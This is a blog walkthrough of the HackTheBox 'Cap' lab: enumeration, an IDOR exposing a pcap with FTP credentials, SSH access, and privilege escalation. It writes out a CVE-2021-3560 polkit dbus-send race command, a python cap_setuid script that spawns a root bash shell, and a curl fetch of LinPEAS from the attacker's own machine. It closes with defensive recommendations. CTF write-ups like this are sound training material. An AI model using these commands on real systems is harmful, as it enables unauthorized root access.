---
title: "Hackthebox Cap Lab"
date: 2025-02-05
media_subpath: /assets/posts/2025-02-05-hackthebox-cap-lab
categories:
- ctf
- red team
tags:
- linux
- hackthebox
- pcap
- file inclusion
- linux capabilities
- red team
published: false
layout: post
---

## Initial Enumeration

**Connectivity Check**  

Sent a ping to 10.10.10.245 to verify the machine was online.  

**Basic Nmap Scan**  

Ran a basic Nmap scan:

`nmap 10.10.10.245`  

![cap_1.png](cap_1.png)  


Identified open ports:
- FTP (21)
- SSH (22)
- HTTP (80)

**FTP Enumeration**  

Tested for anonymous FTP login:  

`ftp 10.10.10.245`

Username: anonymous  
Password: (empty)  
Result: Login failed  

**Service Version and Default Script Scan**

Ran Nmap with service detection and default scripts:  

`nmap -sC -sV 10.10.10.245`  

Checked vsftpd version for known vulnerabilities—none found.

**Web Enumeration**

Navigated to http://10.10.10.245 and discovered what appeared to be a SIEM dashboard. Looking at some different pages it looks like each one contains network information about the machine in the form of outputs of certain commands like `ipconfig` and `netstat`, however, there is also a page which contains details of the packets sent on that machine for a particular user on the machine. When we visit the site we are the user Nathan so it's likely that this page represents a pcap specifically for the user Nathan.  

We can download the pcap although there is no information in the pcap, but we notice that everytime we re-vists the page the path parameter changes, we can probably change this ourselves to get different pcaps.   

![cap_2.png](cap_2.png)   

After I visited the page multiple times I noticed that it only increments and decrements between [1, 3], and when we change it to something like 4 or 5 it redirects to the home page. However, changing it to 0 we get a pcap with some data which we can download.  

![cap_3.png](cap_3.png)   

Analysing the pcap file in wireshark and looking at the packet statistics (which I always like to do first to get an idea where to start looking) we see that it's all TCP packets with some being HTTP and some being FTP, lets start with the HTTP  

There's only 5 packets with HTTP and none of them contained any useful information:  

![cap_4.png](cap_4.png)   

Moving on to FTP, we immediately see something significant:  

![cap_5.png](cap_5.png)    

We obtain the FTP credentials  `nathan:Buck3tH4TF0RM3!`.  

## Initial Foothold  

We try them with ssh first to see if they're also ssh credentials and we manage to obtain an ssh shell on the machine giving us the user flag:  

![cap_6.png](cap_6.png)  

The first thing I like to do after gaining access is checking what commands we can run with higher privileges using `sudo -l` but there isn't anything we can run with sudo privileges. So we just resort to running `LinPEAS.sh`. The machine doesn't have internet access so we send it from our local machine using the following commands:  

From our local machine in the directory with `LinPEAS.sh`:  
`python -m http.server`  

From the ssh shell on the target machine:  

 (Remember to use your IP on the VPN network)  
`curl -o linpeas.sh http://<YOUR-IP>:8000/linpeas.sh`  


`chmod +x linpeas.sh`  

And run the script  

`./linpeas.sh`  

After running the script in skimming through, the first thing I see is under "Executing Linux Exploit Suggester":  

![cap_7.png](cap_7.png)  

(Remember according to the legend this is 95% an attack vector)  

A google search for this CVE gives us the following [blog](https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/).  

Before reading through and understanding how to exploit this I first want to check if its vulnerable according to the article:  

![cap_8.png](cap_8.png)  

The machine is running Ubuntu 20.04 LTS which is vulnerable according to the article.  

## Privilege Escalation  

**Understanding the Vulnerability**  

- Vulnerability enables an unprivileged local user to get a root shell on the system
- polkit is the system service that’s running under the hood when you see a dialog box, it is a background process
- If you want to do something that requires higher privileges—for example, creating a new user account—then it’s polkit’s job to decide whether or not you’re allowed to do it. 
- This exploit uses accountsservice and gnome-control-center packages as vectors for exploitation
- Vulnerability is triggered by starting a dbus-send command but killing it while polkit is still in the middle of processing the request. 

**Exploitation with CVE-2021-3560**

To measure how long it takes to run the `dbus-send` command normally we need to run:  

`time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1`  


For me it took `0m0.159s`, so based on the article we need to kill the `dbus-send` command after 80 milliseconds, so the command we need to run is:  

`dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.080s ; kill $!`  

Now I struggled a lot with trying to exploit this vulnerability based on the instructions outlined in the article, I experimented with various times to kill the dbus-send command, measured the time the command took to run again and experimented some more but it just wouldn't work for me, so I went back to the linpeas output and there was another potential attack vector

**Exploitation with misconfigured capabilities**

![cap_9.png](cap_9.png)  

A google search for "cap_setuid" tells us that this [linux capability](https://man7.org/linux/man-pages/man7/capabilities.7.html){:target="_blank"} is used to make arbitrary manipulations of process UIDs. The first idea that came to mine was being able to set the UID to the root UID which is by default 0 on linux machines.  

So what we can do since our user can use this capability is create a script which opens a bash session with UID 0 and run this script, this was the python script I used:  

```
import os

os.setuid(0)
os.system("/bin/bash")
```

I ran this script using `python3 script.py` and successfully gained a bash shell with root and got the root flag under /root/root.txt:  

![cap_10.png](cap_10.png)  

## Machine Review

#### What was learned

- Exploiting IDOR vulnerability through path parameter in URL
- Analysing FTP traffic via pcap to gain sensitive information
- Exploiting misconfigured linux capabilities  


#### How would I prevent this vulnerability

**Preventing IDOR via path parameter in URL**  

- Firstly to prevent the IDOR vulnerability I would recommend implementing some form of access control check when a user tries to access an object (popular web frameworks will usually provide this by default)
- To add additional layer of defense use complex identifiers (e.g. don't use basic incremental identifier for object like 1, then 2, then 3)

[OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html){:target="_blank"}

**Preventing Privilege Escalation via Linux Process Capabilities**  

- Follow the principle of least privilege, assign only the necessary capabilities to processes and users. Limit capabilities to what is required for specific tasks
- Auditing and reviews of the capabilities assigned to executable files, processes, and users.
- Review and restrict capabilities assigned to these binaries to prevent unauthorized privilege escalation.

Elastic guide on Privilege Escalation via Linux Process Capabilities including how to prevent it [here](https://www.elastic.co/security-labs/unlocking-power-safely-privilege-escalation-via-linux-process-capabilities){:target="_blank"}








